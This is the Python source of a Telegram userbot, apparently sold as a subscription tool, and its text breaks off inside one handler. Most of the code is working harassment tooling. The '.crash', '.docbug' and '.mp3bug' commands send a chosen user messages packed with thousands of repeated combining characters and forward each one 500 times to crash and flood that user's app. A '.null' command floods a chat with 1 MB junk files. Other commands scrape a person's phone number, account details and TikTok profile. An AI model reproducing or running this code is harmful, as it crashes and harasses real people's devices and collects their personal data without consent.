import os
import json
import asyncio
import requests
from bs4 import BeautifulSoup as BSoup
from telethon import functions, types
from telethon.tl.functions.messages import ReportSpamRequest
from telethon import TelegramClient, events, types
from telethon.errors import SessionPasswordNeededError, FloodWaitError
import platform
import time
import sys
import logging
from telethon import events
import instaloader
import logging
import sys
from datetime import datetime

def check_expiry_date(expiry_date_str):
    """
    Verifica si la fecha actual ha pasado la fecha de expiración.
    
    :param expiry_date_str: Fecha de expiración en formato 'YYYY-MM-DD'.
    """
    expiry_date = datetime.strptime(expiry_date_str, '%Y-%m-%d')
    current_date = datetime.now()

    if current_date > expiry_date:
        print("El script ha expirado y no puede continuar.")
        sys.exit(0)
    else:
        print("[?] Suscripcion activa, caduca el 31/12/2024")
        print("")

# Fecha de expiración en formato 'YYYY-MM-DD'
expiry_date_str = '2024-12-31'

# Verificar la fecha de expiración al iniciar el script
check_expiry_date(expiry_date_str)



# Tamaño máximo de los archivos en bytes (1 MB = 1,048,576 bytes)
MAX_FILE_SIZE = 1 * 1024 * 1024  

# Colores ANSI
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"

def loading_animation(text):
    """
    Crea una animación de carga simple.
    """
    for i in range(3):
        sys.stdout.write(f"\r{CYAN}{text}{'.' * i}{RESET}   ")
        sys.stdout.flush()
        time.sleep(0.3)
    sys.stdout.write("\r")

def print_banner():
    """
    Imprime el banner con colores personalizados.
    """
    banner = f"""
{GREEN}╭──────────────────────────────────╮
│         {BOLD}TELEGRAM API{RESET}{GREEN}             │
│  ------------------------------  │
│    {YELLOW}Autor:{RESET} RIP-Network            {GREEN}│
│    {YELLOW}Version:{RESET} 2.1                  {GREEN}│
│    {YELLOW}Fecha:{RESET} 30/11/2024             {GREEN}│
╰──────────────────────────────────╯

╭──────────────────────────────────╮
│         {BOLD}Social Links{RESET}{GREEN}             │
│  ------------------------------  │
│    YT: youtube.com/@ripnetwork   │
│    IG: instagram.com/ripnetworkyt│
│    GH: github.com/RIP-Network    │
╰──────────────────────────────────╯

[*] {CYAN}LOGS{RESET} {GREEN}[*]{RESET}
"""
    
    loading_animation("Cargando bot")
    print(banner)

def clear_terminal():
    os_type = platform.system()
    if os_type == 'Windows':
        os.system('cls')
    else:
        os.system('clear')

# Cargar configuración
with open('config.json', 'r') as f:
    config = json.load(f)

api_id = config['api_id']
api_hash = config['api_hash']
phone_number = config['phone_number']

# Crear cliente de Telegram
client = TelegramClient('telegram_session', api_id, api_hash)

# Directorio de los archivos
file_directory = "archivos"
if not os.path.exists(file_directory):
    os.makedirs(file_directory)

def create_file(file_number):
    """
    Crea un archivo de 1 MB con contenido ficticio.
    """
    file_path = os.path.join(file_directory, f"{file_number}.null")
    if not os.path.exists(file_path):
        with open(file_path, 'wb') as f:
            # Rellenar el archivo con datos para alcanzar 1 MB
            f.write(b"0" * MAX_FILE_SIZE)
        print(f"{GREEN}[*] Archivo {file_number}.null creado con tamaño máximo de 1 MB.{RESET}")
    return file_path

async def send_files(chat_id, count):
    """
    Envía hasta `count` archivos al chat, asegurándose de que tengan el tamaño adecuado.
    """
    try:
        for i in range(1, count + 1):
            # Crear el archivo si no existe
            file_path = create_file(i)
            
            # Enviar el archivo
            await client.send_file(chat_id, file=file_path)
            print(f"{CYAN}[*] Archivo {i}.null enviado correctamente.{RESET}")
            await asyncio.sleep(0.2)  # Pausa para evitar restricciones de la API
    except Exception as e:
        print(f"{RED}[!] Error al enviar archivos: {e}{RESET}")

async def send_menu_message(chat_id):
    """
    Envía el menú informativo al usuario con una imagen.
    """
    response_message = (
        f"╭═════════════════════════╮\n"
        f"│ 🚀 **TELEGRAM API V 2.2** │\n"
        f"╰═════════════════════════╯\n"
        f"╭──────── 📋 **INFO** ───────╮\n"
        f"│ 👨‍💻 **Creador:** RIP Network\n"
        f"│ 📆 **Última actualización:** 2024/12/06\n"
        f"│ 🌟 **Versión:** 2.2\n"
        f"│ 🛠️ **Sistema:** Aarch64\n"
        f"│ ✅ **Estado:** Activo\n"
        f"│ 📱 **Contacto:** +553195249807\n"
        f"╰─────────────────────────╯\n"
        f"╭──────── **COMANDOS** ───────╮\n"
        f"┃\n"
        f"┃ 📌 **Comandos Crash Android:**\n"
        f"┃   \n"
        f"┃   ∠ `.null <cantidad>` \n"
        f"┃   ∠ `.crash @Usuario` \n"
        f"┃   ∠ `.docbug @Usuario` \n"
        f"┃   ∠ `.mp3bug @Usuario` \n"
        f"┃   ∠ `.locbug @Usuario` \n"
        f"┃\n"
        f"┃ 📌 **Otros:**\n"
        f"┃   \n"
        f"┃   ∠ `.msginfo <Responder>` \n"
        f"┃   ∠ `.igosint @Account` \n"
        f"┃   ∠ `.tikosint @Account` \n"
        f"┃\n"
        f"╰─────────────────────────╯\n"
        f"⚠️ **Nota:** Utiliza los comandos con responsabilidad."
    )

    image_path = 'Modules/foto.jpg'

    if not os.path.isfile(image_path):
        print(f"{RED}[!] No se encontró la imagen {image_path}. Enviando solo texto.{RESET}")
        await client.send_message(chat_id, response_message)
        return

    try:
        # Enviar imagen con mensaje
        message = await client.send_file(
            chat_id,
            file=image_path,
            caption=response_message
        )
        print(f"{GREEN}[*] Menú enviado con éxito.{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error al enviar el menú: {e}{RESET}")

@client.on(events.NewMessage(pattern=r'\.menu'))
async def menu_handler(event):
    """
    Manejador para el comando .menu
    """
    await send_menu_message(event.chat_id)

@client.on(events.NewMessage(pattern=r'\.msginfo'))
async def rvsid_handler(event):
    try:
        # Verificar si el comando responde a un mensaje
        if not event.reply_to_msg_id:
            await event.respond("[ℹ️] Por favor, responde a un mensaje para obtener su información.")
            return

        # Obtener el mensaje respondido
        replied_message = await event.get_reply_message()

        if not replied_message:
            await event.respond("[ℹ️] No se pudo obtener el mensaje respondido.")
            return

        # Obtener información del usuario que envió el mensaje
        sender = await client.get_entity(replied_message.sender_id)

        # Obtener el rol del usuario en el grupo
        group_info = await client.get_permissions(event.chat_id, sender.id)
        if group_info.is_admin:
            role = "Administrador"
        elif group_info.is_creator:
            role = "Creador"
        else:
            role = "Miembro"

        # Contar la cantidad de mensajes del usuario en el grupo
        message_count = await client.get_messages(event.chat_id, from_user=sender.id, limit=None)
        total_messages = len(message_count)

        # Obtener la fecha de creación de la cuenta si está disponible
        creation_date = None
        if hasattr(sender, "creation_date"):
            creation_date = sender.creation_date

        # Comprobar si el usuario te tiene bloqueado
        try:
            is_blocked = not await client.get_entity(sender.id)
        except:
            is_blocked = True

        # Crear enlaces directos al chat
        link_by_id = f"https://t.me/c/{sender.id}"
        link_by_username = f"https://t.me/{sender.username}" if sender.username else "N/A"

        # Construir la estructura JSON
        message_info = [
            {
                "status": "200",
                "jid": f"{sender.id}@telegram.net",
                "content": {
                    "tag": "participant",
                    "attrs": {
                        "jid": f"{sender.id}@telegram.net",
                        "username": sender.username if sender.username else "N/A",
                        "first_name": sender.first_name if sender.first_name else "N/A",
                        "last_name": sender.last_name if sender.last_name else "N/A",
                        "phone": sender.phone if sender.phone else "N/A",
                        "account_creation_date": str(creation_date) if creation_date else "N/A",
                        "link_by_id": link_by_id,
                        "link_by_username": link_by_username,
                        "role": role,
                        "total_messages": total_messages,
                        "message_id": replied_message.id,
                        "message_text": replied_message.message if replied_message.message else "N/A",
                        "date": str(replied_message.date),
                        "is_bot": sender.bot if hasattr(sender, "bot") else False,
                        "is_blocked": is_blocked
                    }
                }
            }
        ]

        # Convertir a JSON con indentación para mejor visualización
        message_info_json = json.dumps(message_info, indent=4)
        await event.respond(f"```{message_info_json}```", parse_mode="markdown")

    except Exception as e:
        logging.error(f"Error en rvsid_handler: {e}")
        await event.respond("[🛑] Ocurrió un error al intentar obtener la información del mensaje.")

@client.on(events.NewMessage(pattern=r'\.crash @(\w+)'))
async def send_handler(event):
    try:
        # Obtener el usuario mencionado
        username = event.pattern_match.group(1)
        message_text = "[RIP-Network!? ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾiꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾoꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ](https://telegra.ph/file/05b7e6f87cea4b76ac67a.png)"

        # Obtener la entidad del usuario
        user = await client.get_entity(username)

        # Enviar el mensaje al usuario mencionado
        message = await client.send_message(user, message_text)
        print(f"{GREEN}[*] Mensaje enviado a {username}.{RESET}")
        await event.respond("```[🌀] Telegram API V2 Bug enviado con exito!\n\n[🙇] Cantidad procesada: 500\n\n[💤] Tipo de crash: ExtendedMessage\n\n[🎃] Creador: RIP-Network\n\n[🔐]NOTA: Espere 10s antes de volver a usar el comando para evitar ban de la cuenta como spam o actividad sospechosa.```[///////////////////////////////////////////////////////](https://telegra.ph/file/05b7e6f87cea4b76ac67a.png)", parse_mode="markdown")

        # Reenviar el mensaje 5 veces
        for _ in range(500):
            await client.forward_messages(user, message)
            print(f"{GREEN}[*] Mensaje reenviado a {username}.{RESET}")
            await asyncio.sleep(1)  # Pausa de 1 segundo entre reenvíos
            
        
    except Exception as e:
        logging.error(f"Error en send_handler: {e}")
        await event.respond(f"[🛑] Error al enviar el mensaje a @{username}: {e}")

@client.on(events.NewMessage(pattern=r'\.null (\d+)'))
async def null_handler(event):
    try:
        # Obtener la cantidad de archivos a enviar
        quantity = int(event.pattern_match.group(1))
        await send_files(event.chat_id, quantity)

    except Exception as e:
        print(f"{RED}[!] Error al procesar el comando .null: {e}{RESET}")

@client.on(events.NewMessage(pattern=r'\.tikosint @(\w+)'))
async def tiktokeye_handler(event):
    try:
        username = event.pattern_match.group(1)

        def get_tiktoker(username: str, user_agent=None):
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, como Gecko) '
                          'Chrome/114.0.5748.222 Safari/537.36'
            }
            tiktok_url = 'https://www.tiktok.com/@'

            if user_agent != 'None':
                headers = {
                    'User-Agent': user_agent
                }

            response = requests.get(tiktok_url + username, headers=headers)
            soup = BSoup(response.text, 'html.parser')
            script_tag = soup.find('script', id='__UNIVERSAL_DATA_FOR_REHYDRATION__', type='application/json')

            if script_tag:
                try:
                    json_data = json.loads(script_tag.string)
                    return parse_tiktoker_data(json_data['__DEFAULT_SCOPE__']['webapp.user-detail'])
                except json.JSONDecodeError as error:
                    return f'Error parsing JSON: {error}'
            else:
                return 'No script tag with id="__UNIVERSAL_DATA_FOR_REHYDRATION__" found.'

        def parse_tiktoker_data(field: dict):
            user_data = field["userInfo"]["user"]
            user_stats = field["userInfo"]["stats"]
            user_share_meta = field["shareMeta"]

            result = (
                f'\n{"-" * 15} User Information {"-" * 15}\n'
                f'{RED}Account ID:{GREEN}       {user_data["id"]}\n'
                f'{RED}Unique ID:{GREEN}        {user_data["uniqueId"]}\n'
                f'{RED}Nickname:{GREEN}         {user_data["nickname"]}\n'
                f'{RED}Bios:{GREEN}             {user_data["signature"].replace("\\n", " ")}\n'
                f'{RED}Private Account:{GREEN}  {user_data["privateAccount"]}\n'
                f'{RED}User Country:{GREEN}     {user_data["region"]}\n'
                f'{RED}Account Language:{GREEN} {user_data["language"]}\n'
                f'\n{RED}Total Followers:{GREEN}  {user_stats["followerCount"]}\n'
                f'{RED}Total Following:{GREEN}  {user_stats["followingCount"]}\n'
                f'{RED}Total Hearts:{GREEN}     {user_stats["heartCount"]}\n'
                f'{RED}Total Posts:{GREEN}      {user_stats["videoCount"]}\n'
                f'\n{RED}Title:{GREEN}            {user_share_meta["title"]}\n'
                f'{RED}Description:{GREEN}      {user_share_meta["desc"]}\n'
            )
            return result

        result = get_tiktoker(username)
        await event.respond(f"```{result}```", parse_mode="markdown")

    except Exception as e:
        logging.error(f"Error en tiktokeye_handler: {e}")
        await event.respond(f"[🛑] Error al obtener información de TikTok para @{username}: {e}")

@client.on(events.NewMessage(pattern=r'\.docbug @(\w+)'))
async def doc_handler(event):
    try:
        # Obtener el usuario mencionado
        username = event.pattern_match.group(1)
        file_path = "Databases/ＲＩＰ－Ｎｅｔｗｏｒｋ.deb"
        message_text = "```🧾 Telegram API V2 🧾 \n RIP-Network!? ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾiꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾoꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ```"

        # Obtener la entidad del usuario
        user = await client.get_entity(username)

        # Enviar el archivo con el mensaje al usuario mencionado
        message = await client.send_file(user, file=file_path, caption=message_text)
        print(f"{GREEN}[*] Archivo enviado a {username}.{RESET}")
        await event.respond("```[🌀] Telegram API V2 Bug enviado con exito!\n\n[🙇] Cantidad procesada: 500\n\n[💤] Tipo de crash: FileSenderBug\n\n[🎃] Creador: RIP-Network\n\n[🔐]NOTA: Espere 10s antes de volver a usar el comando para evitar ban de la cuenta como spam o actividad sospechosa.```[///////////////////////////////////////////////////////](https://telegra.ph/file/05b7e6f87cea4b76ac67a.png)", parse_mode="markdown")

        # Reenviar el mensaje 5 veces
        for _ in range(500):
            await client.forward_messages(user, message)
            print(f"{GREEN}[*] Archivo reenviado a {username}.{RESET}")
            await asyncio.sleep(1)  # Pausa de 1 segundo entre reenvíos

    except Exception as e:
        logging.error(f"Error en doc_handler: {e}")
        await event.respond(f"[🛑] Error al enviar el archivo a @{username}: {e}")

@client.on(events.NewMessage(pattern=r'\.mp3bug @(\w+)'))
async def audio_handler(event):
    try:
        # Obtener el usuario mencionado
        username = event.pattern_match.group(1)
        audio_path = "Databases/ＲＩＰ－Ｎｅｔｗｏｒｋ.mp3"
        message_text = "```🧾 Telegram API V2 🧾 \n RIP-Network!? ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾiꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾoꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ